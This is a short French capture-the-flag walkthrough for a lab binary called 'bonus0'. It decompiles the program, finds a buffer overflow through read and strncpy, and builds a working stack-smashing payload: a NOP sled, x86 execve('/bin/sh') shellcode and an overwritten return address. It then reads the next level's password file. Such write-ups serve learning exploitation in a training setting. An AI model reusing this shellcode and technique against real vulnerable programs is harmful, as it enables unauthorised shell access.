# Bonus 0
---

###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme 3 fonction p, pp, main: 

On vois que la fonction ___p___ contient un __read__, un __buffer[4096]__ et un __strncpy__

C'est ces fonction que l'on vas casser pour exec un shell code 

en faisant crash le programe avec gdb on obtient un offset de ==9==.

on trouve aussi l'addresse du second parametre de read dans la fonction p -> ==0xbfffe670==

###### Étape 3: -- Execution --

Avec offset, et l'addresses , on crée un one-liner python pour executer un payload pour lire le .pass du prochain level.

On augment l'address de 80 pour toucher dans la zone de NOP que l'on vas creer -> ==0xbfffe670== + 80 = ==0xbfffe6c0==

Contruction du payload: 
> (python - c 'print "\x90" * 100 + [shellcode]'; python -c 'print "A" * [offset] + "[address + 80] + "B" * [strnpy(copy len) - len(address) - len(A * [offset])]'; cat -) | ./binary 

Payload final :
```bash
(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' ; python -c 'print "A" * 9 + "\xc0\xe6\xff\xbf" + "B" * 7'; cat -) | ./bonus0
```

Dans le terminal on execute la commande suivante pour récupérer le password du bonus1:

```bash
cat /home/user/bonus1/.pass
```
